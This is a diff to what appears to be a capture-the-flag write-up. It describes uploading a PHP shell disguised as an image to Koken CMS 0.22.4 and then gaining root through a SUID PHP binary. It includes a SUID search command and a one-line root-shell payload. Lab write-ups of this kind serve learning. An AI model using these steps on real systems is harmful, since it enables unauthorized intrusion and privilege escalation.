@@ -162,7 +162,9 @@
 
 ![image](https://github.com/user-attachments/assets/47ceeb7c-ba08-42b2-8f6b-ed703086bdab)
 
-### Exploiting KOKEN CMS Arbitrary file upload
+-------------------
+
+### Exploiting KOKEN CMS 0.22.4 Arbitrary file upload
 
 - [Exploit Db](https://www.exploit-db.com/exploits/48706) details a walkthrough on how to exploit koken cms arbitrary file upload.
 - I imported a php shell code saved as shell.php.jpg
@@ -185,9 +187,26 @@
 
 ![image](https://github.com/user-attachments/assets/011e82be-77c8-449e-a1d9-e279a4b88f5a)
 
+--------------------
+
 ### Privesc with SUID PHP binary
 
--
+- I ran `find / -perm -u=s -type f 2</dev/null` and noticed that `php 7.2` has the suid bit.
+
+![image](https://github.com/user-attachments/assets/8206e6eb-a0f9-4e41-a900-91bee8bfa9e1)
+
+- I used this payload to gain root.
+
+Payload-:```php -r "pcntl_exec('/bin/bash', ['-p']);"```
+
+- Root access....!!!
+
+![image](https://github.com/user-attachments/assets/179a1c55-240f-48bc-9847-e0bf8d4630b2)
+
+### REFERENCE
+
+- [ExploitDB](https://www.exploit-db.com/exploits/48706)
+
 
 
 
